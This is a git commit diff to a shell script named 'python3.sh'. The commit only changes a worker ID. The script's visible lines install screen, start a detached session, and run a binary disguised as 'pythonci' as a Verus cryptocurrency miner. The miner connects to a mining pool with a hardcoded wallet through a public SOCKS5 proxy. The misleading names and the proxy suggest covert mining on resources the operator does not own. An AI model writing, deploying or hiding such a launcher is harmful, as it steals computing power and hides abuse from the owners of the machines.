1aca32c8253ae780b6e9c292d91106e0dec61577
hendrik20212 <87313143+hendrik20212@users.noreply.github.com>
2021-07-19 02:03:17 +0700

    Update python3.sh

--- python3.sh
+++ python3.sh
@@ -4,6 +4,6 @@ sudo apt install screen libjansson4 -y
 screen -dmS ls
 POOL=stratum+tcp://na.luckpool.net:3956
 WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
-WORKER=0AA1
+WORKER=0AA3
 PROXY=socks5://70.185.68.155:4145
 ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 6 -x $PROXY
